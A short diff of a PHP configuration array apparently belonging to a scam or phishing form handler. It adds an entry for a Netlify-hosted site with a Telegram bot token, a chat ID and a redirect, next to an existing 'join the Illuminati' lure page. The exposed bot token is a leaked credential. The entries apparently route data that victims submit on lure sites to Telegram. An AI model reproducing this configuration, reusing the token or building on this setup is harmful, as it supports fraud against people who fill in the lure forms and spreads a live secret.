@@ -101,6 +101,22 @@ $site_map = [
         ],
         "redirect" => "https://illuminatisacred.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html"
     ],
+
+
+    'crediblely.netlify.app' => [
+        'bots' => [
+            ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
+            ['token' => '', 'chat_id' => '']
+        ],
+        'redirect' => 'https://crediblely.netlify.app'
+    ],
+
+
+
+
+
+
+
 ];
 
 // ============================================
